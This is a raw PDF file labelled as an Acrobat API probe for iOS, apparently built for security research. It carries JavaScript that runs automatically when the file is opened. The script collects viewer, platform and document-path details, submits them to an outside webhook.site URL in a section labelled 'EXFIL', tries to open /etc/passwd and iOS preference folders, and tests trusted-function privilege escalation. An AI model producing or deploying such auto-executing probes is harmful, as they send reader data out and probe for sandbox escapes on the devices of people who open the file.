%PDF-1.7
% Acrobat API Probe - iOS - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];

        // === 1. ACROBAT IDENTITY ===
        results.push("=== IDENTITY ===");
        try { results.push("viewerVersion: " + app.viewerVersion); } catch(e) { results.push("viewerVersion: " + e); }
        try { results.push("viewerType: " + app.viewerType); } catch(e) { results.push("viewerType: " + e); }
        try { results.push("viewerVariation: " + app.viewerVariation); } catch(e) { results.push("viewerVariation: " + e); }
        try { results.push("platform: " + app.platform); } catch(e) { results.push("platform: " + e); }
        try { results.push("language: " + app.language); } catch(e) { results.push("language: " + e); }

        // === 2. DOCUMENT INFO ===
        results.push("=== DOC ===");
        try { results.push("doc.URL: " + this.URL); } catch(e) { results.push("doc.URL: " + e); }
        try { results.push("doc.path: " + this.path); } catch(e) { results.push("doc.path: " + e); }
        try { results.push("doc.filesize: " + this.filesize); } catch(e) { results.push("filesize: " + e); }

        // === 3. NETWORK ===
        results.push("=== NETWORK ===");
        try {
          this.submitForm({
            cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=submitHTML",
            cSubmitAs: "HTML"
          });
          results.push("submitForm HTML: no throw");
        } catch(e) { results.push("submitForm HTML: " + e); }
        try {
          this.submitForm({
            cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=submitFDF",
            cSubmitAs: "FDF"
          });
          results.push("submitForm FDF: no throw");
        } catch(e) { results.push("submitForm FDF: " + e); }
        try {
          app.launchURL("https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=launch", true);
          results.push("launchURL: no throw");
        } catch(e) { results.push("launchURL: " + e); }

        // === 4. FILE SYSTEM ===
        results.push("=== FILES ===");
        try { results.push("openDoc type: " + typeof app.openDoc); } catch(e) { results.push("openDoc type: " + e); }
        try {
          var d = app.openDoc("/etc/passwd");
          results.push("openDoc /etc/passwd: " + d);
        } catch(e) { results.push("openDoc /etc/passwd: " + e); }
        try {
          var d2 = app.openDoc("/var/mobile/Library/Preferences/");
          results.push("openDoc prefs: " + d2);
        } catch(e) { results.push("openDoc prefs: " + e); }

        // === 5. TRUSTED FUNCTIONS ===
        results.push("=== TRUST ===");
        try { results.push("trustedFunction: " + typeof app.trustedFunction); } catch(e) { results.push("trustedFunction: " + e); }
        try { results.push("trustPropagator: " + typeof app.trustPropagatorFunction); } catch(e) { results.push("trustPropagator: " + e); }
        try {
          var tf = app.trustedFunction(function(app) {
            return "trusted exec ok";
          });
          results.push("tf result: " + tf(app));
        } catch(e) { results.push("tf exec: " + e); }

        // === 6. EXFIL DOC DATA VIA NETWORK ===
        results.push("=== EXFIL ===");
        try {
          var docData = "path=" + this.path + "&url=" + this.URL + "&ver=" + app.viewerVersion + "&platform=" + app.platform;
          this.submitForm({
            cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=exfil&" + docData,
            cSubmitAs: "HTML"
          });
          results.push("exfil submit: no throw");
        } catch(e) { results.push("exfil submit: " + e); }

        app.alert(results.join("\\n"));

      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Acrobat API Probe) Tj ET
BT /F1 12 Tf 50 220 Td (Check webhook.site) Tj ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000015 00000 n 
0000000075 00000 n 
0000000135 00000 n 
0000002400 00000 n 
0000002560 00000 n 

trailer
<< /Size 6 /Root 1 0 R >>
startxref
2650
%%EOF